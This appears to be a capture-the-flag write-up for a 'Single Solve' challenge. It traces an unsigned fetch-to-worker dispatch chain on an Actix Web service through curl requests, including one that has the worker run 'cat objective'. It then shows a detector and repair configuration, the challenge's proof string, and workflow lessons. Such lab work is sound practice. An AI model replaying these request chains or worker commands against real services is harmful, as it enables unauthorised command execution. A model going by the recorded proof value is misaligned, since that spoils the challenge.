Single Solve: reconstructing the incident

The target exposed its own clues and request log. Those endpoints were the route map; the route names were randomized for this instance, so they should be read from /api/clues instead of guessed or hardcoded.

The clues identified an Actix Web service and supplied these fields:

  • feature_route: /dispatch-087881
  • secondary_route: /audit-cd855d
  • final_route: /worker-c5716b
  • request_log_route: /api/requests
  • evidence_route: /api/evidence
  • response_route: /api/response
  • fetch_query_field: target
  • event_json_field: token
  • worker_query_field: command

The request log showed the contrast the challenge was built around:

  1. req101: signed fetch allowed for public-status.
  2. req102: unsigned fetch queued for internal target 38fa9180e8d4.
  3. req103: signed fetch allowed for public-notes.

The unsigned queued entry supplied the target value for the route chain. The signed status request was the benign control that the repair needed to preserve.

Triggering the fetch-to-worker chain

First, the feature route created a fetch event for the queued target:

GET /dispatch-087881?target=38fa9180e8d4

It returned 202 with stage fetch_event_created. Calling the worker immediately at this point returned 403 worker_preconditions_missing. That response showed the fetch alone had not completed the dispatch path.

Next, the secondary route had to be called with the same target in the JSON token field:

POST /audit-cd855d
Content-Type: application/json

{"token":"38fa9180e8d4"}

It returned 202, listed status and cat <resource> as available commands, listed objective as a resource, and reported worker_dispatched.

Finally, I dispatched the worker with the objective read command:

POST /worker-c5716b?command=cat%20objective
Content-Type: application/json

{"token":"38fa9180e8d4"}

The service returned 202 unsigned_worker_dispatched. Reading /api/evidence then showed the unsigned worker event alongside the signed status activity and the queued unsigned fetch. This confirmed the complete chain: a queued internal fetch could be advanced through exposed routes into an unsigned worker action.

For this exact Single Solve instance, the requests can be reproduced against the assigned target root:

BASE='https://[per-team CTF host]/'

curl -sS "${BASE}api/clues"
curl -sS "${BASE}api/requests"
curl -i "${BASE}dispatch-087881?target=38fa9180e8d4"
curl -i -X POST "${BASE}audit-cd855d" \
  -H 'Content-Type: application/json' \
  --data '{"token":"38fa9180e8d4"}'
curl -i -X POST "${BASE}worker-c5716b?command=cat%20objective" \
  -H 'Content-Type: application/json' \
  --data '{"token":"38fa9180e8d4"}'
curl -sS "${BASE}api/evidence"

Detector and repair

The evidence response described the regression goal: detect unsigned worker dispatches, block internal fetches and unsigned events, and retain the signed status command. I submitted this configuration to /api/response:

{
  "detector": {
    "kind": "worker.dispatch",
    "signed": false
  },
  "repair": {
    "block_internal_fetch": true,
    "require_signed_event": true,
    "worker_allowlist": ["status"]
  }
}

The service reported incident_detected_and_remediated. Every returned regression check was true:

  • attack_detected
  • benign_status_excluded
  • internal_fetch_blocked
  • status_still_allowed
  • unsigned_event_rejected

That result verifies both sides of the fix: the unsigned dispatch was detected and blocked, and the signed status check continued to work. The exact proof returned by this instance and submitted as proof-1 was Proofproof_2896e5a1940843189a504f705e5f8603.

What made the run slower, and a faster approach

  1. Use the exact challenge and assigned target URLs. The initial broad challenge listing produced irrelevant output. A filtered lookup for the requested challenge, followed by a start/resume of that exact ID, keeps the working set small. For Game Master requests, the Homebase proxy is the supported path.
  2. Read /api/clues and the request log before probing. These gave the dynamic route names, parameter names, and the unsigned target directly. That is faster and more reliable than route guessing or path scanning.
  3. Follow the route prerequisites in order. The worker returned worker_preconditions_missing until the secondary route was called with the matching target token. Once the error showed the missing stage, the clue-defined sequence was straightforward.
  4. Inspect evidence before configuring the response. The evidence endpoint stated the detector and regression requirements. Submitting the detector and repair together then produced a direct, machine-readable pass/fail result for each required behavior.
  5. Do not run a broad solver battery against a well-described custom workflow. The generic recon and expanded battery did not solve Single Solve or Time Trial. For those targets, reading the clues and request log was the useful method. The battery did help identify four familiar Mastery families, so it was useful as a fallback for the heterogeneous bundle.
  6. Classify Mastery targets before applying a workflow. My first attempt assumed the same Full Stack routes would exist on all eight targets and failed immediately on the first unrelated app. Checking each app’s title, clues, and exposed API first would avoid those wasted requests.
  7. Keep one cookie-aware session per target. Case Crate set its session on the landing page, so the timeline and incident requests needed the same cookie jar. Independent target sessions also prevent one target’s cookies from contaminating another.
  8. Wait for the full assignment before dispatching workers. The first Mastery start response did not yet contain the ready target list. Resuming/polling until targets[] was populated avoided guessing which apps or answer IDs were assigned.
  9. Collect all answers, then submit them together. Mastery allowed one batch request for all eight small proof strings. I submitted four first and completed the other four later; gathering the unresolved proofs before submission would have reduced the submission round trips.
  10. Request a timed attempt explicitly when the goal is a timed score. The Time Trial and Mastery runs here were regular untimed attempts (run_for_time: false, deadline: null). A ranked speed run needs a fresh start requested with run_for_time: true.
